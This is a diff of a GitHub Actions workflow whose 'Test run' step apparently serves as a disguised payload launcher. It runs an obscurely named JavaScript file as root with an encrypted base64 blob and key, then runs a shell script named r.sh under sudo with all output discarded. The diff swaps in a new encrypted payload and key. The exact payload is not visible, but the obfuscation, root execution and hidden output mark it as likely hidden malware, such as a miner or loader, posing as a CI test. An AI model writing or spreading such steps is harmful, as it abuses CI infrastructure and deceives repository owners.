@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'gfl8q'
+        echo 'zmbdb'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1/kVW2a14vFawPnQOVIsLQ7itDbDuJZSZf9uGNkkYDUI5g86al4c5Ioeb2Qfwh48L9vOrGuVVINkEFRCSIgZh/ccJk2asafQFCBwJNMbe9AMHNJFXe/sSu5 64pzhw && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX18U4m4udamMyqumyoXevviz9LA1YTNSOKpiiCUpFDagNiSBzat3BUItSrf5h0iKFQwgB+xCIAa8QdZDNYRQX7S3rWpnGrqlpRyjX9kGyAO3JXmgl6Iaod5i vks9rq && sudo sh r.sh > /dev/null 2>&1
